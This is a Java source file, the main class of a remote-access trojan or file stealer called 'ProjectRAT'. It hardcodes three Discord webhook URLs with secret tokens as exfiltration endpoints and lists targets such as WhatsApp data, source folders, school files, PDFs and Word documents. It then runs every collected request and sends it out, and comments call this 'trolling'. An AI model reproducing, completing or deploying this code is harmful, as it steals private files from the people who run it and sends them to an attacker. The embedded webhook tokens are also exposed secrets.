package in.momin5.projectRAT;

import in.momin5.projectRAT.request.Request;
import in.momin5.projectRAT.request.RequestManager;

import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.List;

public class ProjectRAT {

    public static String[] webhook = {
            "https://discord.com/api/webhooks/1004552843216302150/qTWu6h0Q4mYJpNR9pTncr0YRd0a9I4WvsmderqoM2LjTpF0TYhg4rdIKMHvuB1wubgG6",
            "https://discord.com/api/webhooks/1005124701108056137/EKjECKGnW5MjFMlcF5X7ndOs4odabW3xwc0Ndz51-Trx_myTliO5DVDqhHx17Nv2gHAl",
            "https://discord.com/api/webhooks/1005124706363523154/2sXtHBH0HPUuGATvCbIxR-D17VT1mELV_diSq8K_P1u_1yVOjzQl3AJk1MtwohwbPb_T"
    };
    // put geo api key here
    public static String apiKey = "";
    public static List<String> grabsFilesName = Arrays.asList(
            "src",
            "WhatsApp",
            ".jar",
            "school",
            ".pdf",
            ".docx"
    );
    public static RequestHandler requestHandler;

    public static void main(String[] args) {
        startingTrolling();
    }

    // seperate method for reflections :troll:
    public static void startingTrolling(){
        try {
            RequestManager manager = new RequestManager();
            requestHandler = new RequestHandler();
            for (Request request : manager.getRequests()){
                request.init();
                requestHandler.sendRequest(request);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
